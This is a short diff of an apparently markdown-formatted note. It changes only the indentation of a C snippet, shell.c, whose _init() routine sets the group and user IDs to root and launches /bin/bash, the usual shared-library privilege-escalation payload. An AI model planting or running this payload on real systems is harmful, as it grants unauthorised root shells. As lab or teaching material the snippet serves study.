@@ -18,8 +18,8 @@ shell.c
 
 void _init() {
 	setgid(0);
-    setuid(0);
-    system("/bin/bash");
+	setuid(0);
+	system("/bin/bash");
 }
 ```
 
